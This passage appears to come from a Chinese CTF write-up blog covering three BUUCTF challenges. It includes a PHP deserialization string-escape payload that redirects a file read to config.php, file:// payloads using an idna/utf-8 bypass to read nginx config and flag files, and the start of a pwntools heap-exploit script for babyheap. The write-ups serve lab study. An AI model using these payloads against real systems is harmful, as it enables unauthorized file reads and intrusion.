php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable language_">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable language_">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable language_">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable language_">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable language_">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable language_">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;<span class="comment">//过滤序列化字符串，where到hacker少了一字节，存在反序列化字符串逃逸漏洞，可以更改photo值为config.php，获得flag</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>魔改代码，本地调试看一下序列化字符串的样子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;123456@163.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/533369d9abafbff35293d2b52c25e8bc&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>更改nickname，字符串逃逸，更改photo值为config.php，进而读取flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;phone&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">12345678901</span></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;email&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">123</span>@qq.com</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;nickname[]&quot;</span><span class="comment">//nickname为数组可以绕过nick检查</span></span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="comment">//属于过滤后字符串边长，在被过滤的属性内拼接序列化字符串，拼接长度L1，过滤一次缩短L2，那么要添加的关键字key的数量为（L1/L1）。这里len( &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php )=31，所以要添加31个where。</span></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;photo&quot;</span>; filename=<span class="string">&quot;test.py&quot;</span></span><br><span class="line">Content-Type: text/x-python</span><br></pre></td></tr></table></figure><p>最后查看profile.php，将图片base64解吗即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="发序列字符串逃逸公式"><a href="#发序列字符串逃逸公式" class="headerlink" title="发序列字符串逃逸公式"></a>发序列字符串逃逸公式</h3><p><strong>过滤后边长：</strong></p><p>在被过滤的属性内拼接序列化字符串；<br>添加的关键字key的数量为（L1&#x2F;L1），拼接长度L1，过滤一次缩短L2。  </p><p><strong>过滤后边短：</strong><br>在被过滤的属性的下一个属性内拼接序列化字符串；<br>计算出要吞掉的长度L1；<br>添加的关键字key的数量为（L1&#x2F;L1），要吞掉的长度为L1，过滤一次缩短L2。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[SUCTF 2019]Pythonginx idna与utf-8编码漏洞</title>
      <link href="/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/04/24/BUUCTF-WEB-SUCTF-2019-Pythonginx-idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><ol><li>nginx文件配置</li><li>idna与utf-8编码漏洞</li></ol><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="nginx文件配置"><a href="#nginx文件配置" class="headerlink" title="nginx文件配置"></a>nginx文件配置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line"></span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line"></span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line"></span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line"></span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line"></span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br></pre></td></tr></table></figure><h3 id="idna与utf-8编码漏洞"><a href="#idna与utf-8编码漏洞" class="headerlink" title="idna与utf-8编码漏洞"></a>idna与utf-8编码漏洞</h3><p><strong>什么是IDN?</strong><br>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p><p><strong>什么是idna?</strong><br>支持 RFC 5891 中指定的应用程序中的国际化域名 (IDNA) 协议的库。该版本的协议通常被称为“IDNA2008”，并且可以产生与 2003 年早期标准不同的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> idna</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(idna.encode(<span class="string">u&#x27;ドメイン.テスト&#x27;</span>))</span><br><span class="line">结果:xn--eckwd4c7c.xn--zckzah</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> idna.decode(<span class="string">&#x27;xn--eckwd4c7c.xn--zckzah&#x27;</span>)</span><br><span class="line">结果:ドメイン.テスト</span><br></pre></td></tr></table></figure><p>Demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">℆这个字符,如果使用python3进行idna编码的话</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;℆&#x27;</span>.encode(<span class="string">&#x27;idna&#x27;</span>))</span><br><span class="line">结果</span><br><span class="line"><span class="string">b&#x27;c/u&#x27;</span></span><br><span class="line">如果再使用utf-<span class="number">8</span>进行解码的话</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;c/u&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">结果</span><br><span class="line">c/u</span><br></pre></td></tr></table></figure><p>通过这种方法可以绕过网站的一些过滤字符.</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf <span class="comment">#拿到flag文件名</span></span><br><span class="line">file://suctf.c℆sr/fffffflag <span class="comment">#获取flag</span></span><br></pre></td></tr></table></figure><p>查找字符脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">    tmp=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:<span class="comment">#这里根据需要删除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/115451137">https://blog.csdn.net/RABCDXB/article/details/115451137</a><br><a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-PWN-0ctf_2017_babyheap</title>
      <link href="/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/"/>
      <url>/2022/04/24/BUUCTF-PWN-0ctf-2017-babyheap/</url>
      
        <content type="html"><![CDATA[<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Allocate 申请</span><br><span class="line">2. Fill 填充，漏洞点，可以自定义大小填充</span><br><span class="line">3. Free 释放</span><br><span class="line">4. Dump 输出</span><br><span class="line">5. Exit 推出</span><br></pre></td></tr></table></figure><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>Fastbin Attack&#x2F;Unsorted Bin Attack</p><h2 id="利用逻辑"><a href="#利用逻辑" class="headerlink" title="利用逻辑"></a>利用逻辑</h2><ol><li>泄露libc<br>unsorted bin atack 泄露main_arena地址<br><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin-attack">原理</a></li><li>修改__mlloc_hook<br>fastbin attack 修改__mlloc_hook<br><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">原理</a><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2>以编写exp为底<br><a href="https://www.smlight.top/2020/09/24/change-libc-before-excuting/">关于libc的问题</a><h3 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./babyheap&#x27;</span>)<span class="comment">#名字太长，我给重命名了。</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./libc6_2.23.so&#x27;</span>)<span class="comment">#题目提示ubuntu 16，所以一般用的是64位 2.23</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()<span class="comment">#交互</span></span><br></pre></td></tr></table></figure><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3></li><li>准备基本的堆结构<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./babyheap&quot;</span>) <span class="comment">#名字太长，我给重命名了。</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;../libc6_2.23.so&#x27;</span>)<span class="comment">#题目提示ubuntu 16，所以一般用的是64位 2.23</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span 